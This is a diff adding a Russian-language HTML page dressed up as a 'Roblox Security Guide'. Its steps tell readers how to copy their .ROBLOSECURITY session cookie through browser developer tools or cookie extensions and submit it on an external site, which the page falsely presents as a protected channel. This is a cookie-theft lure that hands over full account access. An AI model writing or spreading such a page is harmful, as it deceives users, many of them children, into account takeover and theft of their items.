@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Crescent · Roblox Security Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 30% 20%, #0f0c29, #1a1a2e, #0a0a14);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 70% 80%, rgba(100, 80, 255, 0.15), transparent 60%),
+                        radial-gradient(circle at 30% 10%, rgba(0, 255, 200, 0.08), transparent 50%);
+            animation: floatBg 18s ease-in-out infinite alternate;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes floatBg {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(-3%, -2%) scale(1.02); }
+        }
+
+        .glass-card {
+            position: relative;
+            z-index: 2;
+            max-width: 600px;
+            width: 100%;
+            background: rgba(20, 20, 35, 0.38);
+            backdrop-filter: blur(18px) saturate(180%);
+            -webkit-backdrop-filter: blur(18px) saturate(180%);
+            border: 1px solid rgba(210, 180, 255, 0.25);
+            border-radius: 42px;
+            padding: 36px 28px 32px;
+            box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(170, 130, 255, 0.1) inset;
+            transition: transform 0.25s ease, box-shadow 0.3s ease;
+            animation: fadeGlass 0.9s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes fadeGlass {
+            0% { opacity: 0; transform: translateY(18px); backdrop-filter: blur(8px); }
+            100% { opacity: 1; transform: translateY(0); backdrop-filter: blur(18px); }
+        }
+
+        .glass-card:hover {
+            box-shadow: 0 30px 50px -8px #00000060, 0 0 0 1.5px rgba(200, 160, 255, 0.3) inset;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #f0eaff, #cbb2ff, #a88bff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+            text-shadow: 0 2px 15px rgba(130, 80, 255, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .crescent-badge {
+            font-size: 0.9rem;
+            font-weight: 400;
+            background: rgba(150, 120, 255, 0.18);
+            padding: 4px 12px;
+            border-radius: 40px;
+            border: 1px solid rgba(210, 180, 255, 0.35);
+            color: #d7c6ff;
+            letter-spacing: 0.3px;
+            backdrop-filter: blur(4px);
+        }
+
+        .description {
+            color: #cfc2f0;
+            margin-bottom: 24px;
+            font-weight: 400;
+            font-size: 1rem;
+            border-left: 3px solid #9f7aff;
+            padding-left: 18px;
+            text-shadow: 0 1px 3px black;
+        }
+
+        .step-section {
+            margin-bottom: 28px;
+        }
+
+        .step-title {
+            color: #e3d9ff;
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-number {
+            background: linear-gradient(145deg, #6d4aff, #4a2cd9);
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: white;
+            box-shadow: 0 6px 12px #2f1e7a40;
+            border: 1px solid #b49aff;
+        }
+
+        .step-content {
+            color: #d0c4f0;
+            padding-left: 42px;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .code-block {
+            background: rgba(10, 8, 20, 0.65);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border: 1px solid rgba(190, 160, 255, 0.35);
+            border-radius: 20px;
+            padding: 14px 18px;
+            margin: 12px 0;
+            font-family: 'SF Mono', 'Menlo', 'Monaco', 'Cascadia Code', monospace;
+            color: #b8a4ff;
+            font-size: 0.85rem;
+            word-break: break-all;
+            box-shadow: inset 0 2px 6px #00000030;
+        }
+
+        .highlight {
+            color: #ffd966;
+            font-weight: 500;
+        }
+
+        .platform-tabs {
+            display: flex;
+            gap: 8px;
+            margin: 16px 0 8px;
+        }
+
+        .platform-btn {
+            background: rgba(25, 20, 45, 0.5);
+            border: 1px solid rgba(190, 160, 255, 0.3);
+            border-radius: 40px;
+            padding: 10px 20px;
+            color: #cfc2f0;
+            font-weight: 500;
+            font-size: 0.9rem;
+            cursor: pointer;
+            backdrop-filter: blur(4px);
+            transition: all 0.2s;
+            flex: 1;
+            text-align: center;
+        }
+
+        .platform-btn.active {
+            background: linear-gradient(145deg, #6d4aff, #4a2cd9);
+            border-color: #b49aff;
+            color: white;
+            box-shadow: 0 6px 12px #2f1e7a60;
+        }
+
+        .platform-content {
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+
+        .platform-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .link-button {
+            display: inline-block;
+            background: rgba(109, 74, 255, 0.25);
+            border: 1px solid #9f7aff;
+            border-radius: 40px;
+            padding: 12px 22px;
+            color: #e3d9ff;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 16px;
+            backdrop-filter: blur(4px);
+            transition: all 0.2s;
+            text-align: center;
+            width: 100%;
+            font-size: 1rem;
+        }
+
+        .link-button:hover {
+            background: rgba(109, 74, 255, 0.4);
+            border-color: #cbb2ff;
+        }
+
+        .warning-note {
+            background: rgba(255, 180, 40, 0.12);
+            border: 1px solid #ffb84d40;
+            border-radius: 20px;
+            padding: 14px 18px;
+            color: #ffdb9f;
+            font-size: 0.9rem;
+            margin: 20px 0;
+            backdrop-filter: blur(4px);
+        }
+
+        .footer-note {
+            margin-top: 24px;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            color: #9b88cf;
+            font-size: 0.8rem;
+            border-top: 1px dashed #6a53a8;
+            padding-top: 20px;
+        }
+
+        .glow-text {
+            color: #d2bdff;
+        }
+
+        @media (max-width: 480px) {
+            .glass-card { padding: 24px 18px; border-radius: 34px; }
+            h1 { font-size: 1.8rem; }
+            .step-content { padding-left: 12px; }
+            .step-number { width: 28px; height: 28px; font-size: 0.9rem; }
+            .code-block { font-size: 0.75rem; padding: 12px; }
+        }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="glass-card">
+        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
+            <h1>
+                📘 ROBSEC GUIDE
+                <span class="crescent-badge">Crescent</span>
+            </h1>
+        </div>
+        <div class="description">
+            Как получить .ROBLOSECURITY cookie и отправить на сайт
+        </div>
+
+        <!-- Шаг 1 -->
+        <div class="step-section">
+            <div class="step-title">
+                <span class="step-number">1</span>
+                Открой Roblox
+            </div>
+            <div class="step-content">
+                Зайди на <span class="highlight">roblox.com</span> через браузер и войди в свой аккаунт.
+                <div class="platform-tabs">
+                    <button class="platform-btn active" data-platform="pc">💻 ПК</button>
+                    <button class="platform-btn" data-platform="android">📱 Android</button>
+                    <button class="platform-btn" data-platform="ios">📱 iOS</button>
+                </div>
+                
+                <div id="pc-content" class="platform-content active">
+                    <div class="code-block">
+                        Используй <span class="highlight">Chrome, Edge, Firefox</span> или любой браузер с инструментами разработчика (F12).
+                    </div>
+                </div>
+                <div id="android-content" class="platform-content">
+                    <div class="code-block">
+                        Рекомендуем <span class="highlight">Kiwi Browser</span> или <span class="highlight">Chrome</span> с режимом "Версия для ПК".
+                    </div>
+                </div>
+                <div id="ios-content" class="platform-content">
+                    <div class="code-block">
+                        Используй <span class="highlight">Safari</span> или <span class="highlight">Orion Browser</span> (поддерживает расширения).
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Шаг 2 -->
+        <div class="step-section">
+            <div class="step-title">
+                <span class="step-number">2</span>
+                Открой инструменты разработчика
+            </div>
+            <div class="step-content">
+                <div id="pc-inspect" class="platform-content active" data-pc-inspect>
+                    Нажми <span class="highlight">F12</span> или <span class="highlight">Ctrl+Shift+I</span> (Cmd+Option+I на Mac).<br>
+                    Перейди во вкладку <span class="highlight">Application</span> (или "Хранилище").
+                </div>
+                <div id="android-inspect" class="platform-content" data-android-inspect>
+                    В Kiwi Browser: нажми <span class="highlight">⋮ → Инструменты разработчика</span>.<br>
+                    В Chrome: в адресной строке добавь <span class="highlight">view-source:</span> перед URL (ограниченно).
+                </div>
+                <div id="ios-inspect" class="platform-content" data-ios-inspect>
+                    В Safari: <span class="highlight">Настройки → Safari → Расширения → Веб-инспектор</span> (включи).<br>
+                    Затем долгое нажатие на странице → "Исследовать элемент".
+                </div>
+            </div>
+        </div>
+
+        <!-- Шаг 3 -->
+        <div class="step-section">
+            <div class="step-title">
+                <span class="step-number">3</span>
+                Найди .ROBLOSECURITY
+            </div>
+            <div class="step-content">
+                В левой панели найди раздел <span class="highlight">Cookies</span> → <span class="highlight">https://www.roblox.com</span>.<br>
+                В списке найди строку с именем <span class="highlight">.ROBLOSECURITY</span>.
+                <div class="code-block">
+                    Имя: .ROBLOSECURITY<br>
+                    Значение: _|WARNING:-DO-NOT-SHARE-THIS... (длинная строка)
+                </div>
+                <span class="highlight">👉 Дважды кликни по значению и скопируй его полностью!</span>
+            </div>
+        </div>
+
+        <!-- Шаг 4 -->
+        <div class="step-section">
+            <div class="step-title">
+                <span class="step-number">4</span>
+                Отправь на сайт Crescent
+            </div>
+            <div class="step-content">
+                Перейди на страницу приёма cookie:<br>
+                <a href="https://klentsi.github.io/RBXTOOLS.github.io/" class="link-button">
+                    🌙 Перейти к отправке →
+                </a>
+                <div class="warning-note">
+                    ⚠️ <strong>Важно:</strong> Вставь скопированный cookie в поле и нажми "Отправить".<br>
+                    Данные передаются по защищённому каналу Crescent.
+                </div>
+            </div>
+        </div>
+
+        <!-- Альтернативный метод -->
+        <div class="step-section">
+            <div class="step-title">
+                <span class="step-number">📎</span>
+                Альтернативный метод (расширение)
+            </div>
+            <div class="step-content">
+                Установи расширение <span class="highlight">EditThisCookie</span> или <span class="highlight">Cookie-Editor</span>.<br>
+                После входа в Roblox нажми на иконку расширения → найди .ROBLOSECURITY → экспортируй или скопируй значение.
+            </div>
+        </div>
+
+        <div class="footer-note">
+            <span>🔒 Crescent Internal Guide</span>
+            <span class="glow-text">v1.0 · 📖</span>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // Переключение платформ
+            const platformBtns = document.querySelectorAll('.platform-btn');
+            const pcContent = document.getElementById('pc-content');
+            const androidContent = document.getElementById('android-content');
+            const iosContent = document.getElementById('ios-content');
+            
+            const pcInspect = document.querySelector('[data-pc-inspect]');
+            const androidInspect = document.querySelector('[data-android-inspect]');
+            const iosInspect = document.querySelector('[data-ios-inspect]');
+
+            function switchPlatform(platform) {
+                // Обновляем кнопки
+                platformBtns.forEach(btn => {
+                    btn.classList.remove('active');
+                    if (btn.dataset.platform === platform) {
+                        btn.classList.add('active');
+                    }
+                });
+
+                // Переключаем контент шага 1
+                pcContent.classList.remove('active');
+                androidContent.classList.remove('active');
+                iosContent.classList.remove('active');
+                
+                if (platform === 'pc') pcContent.classList.add('active');
+                if (platform === 'android') androidContent.classList.add('active');
+                if (platform === 'ios') iosContent.classList.add('active');
+
+                // Переключаем контент шага 2 (инструменты)
+                if (pcInspect) pcInspect.classList.remove('active');
+                if (androidInspect) androidInspect.classList.remove('active');
+                if (iosInspect) iosInspect.classList.remove('active');
+                
+                if (platform === 'pc' && pcInspect) pcInspect.classList.add('active');
+                if (platform === 'android' && androidInspect) androidInspect.classList.add('active');
+                if (platform === 'ios' && iosInspect) iosInspect.classList.add('active');
+            }
+
+            platformBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    switchPlatform(btn.dataset.platform);
+                });
+            });
+
+            // Определяем ОС для предустановки
+            const ua = navigator.userAgent;
+            if (/Android/i.test(ua)) {
+                switchPlatform('android');
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                switchPlatform('ios');
+            } else {
+                switchPlatform('pc');
+            }
+        })();
+    </script>
+</body>
+</html>
